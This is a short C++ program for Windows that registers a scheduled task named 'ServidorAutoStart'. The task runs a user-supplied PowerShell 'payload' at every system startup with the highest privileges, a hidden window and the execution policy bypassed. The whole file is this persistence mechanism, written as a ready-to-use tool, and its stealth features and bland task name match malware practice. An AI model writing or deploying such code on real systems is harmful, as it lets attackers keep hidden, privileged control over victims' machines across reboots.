#include <iostream>
#include <windows.h>
#include <string>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: scheduler.exe <FullPathToPayload.ps1>\n";
        return 1;
    }

    std::string payloadPath = argv[1];
    std::string taskName = "ServidorAutoStart";

    // Construct the schtasks command
    std::string command = "schtasks /Create /F /TN \"" + taskName +
                          "\" /TR \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" +
                          payloadPath + "\\\"\" /SC ONSTART /RL HIGHEST";

    // Execute the command
    system(command.c_str());

    std::cout << "Scheduled task '" << taskName << "' created for payload: " << payloadPath << "\n";
    return 0;
}
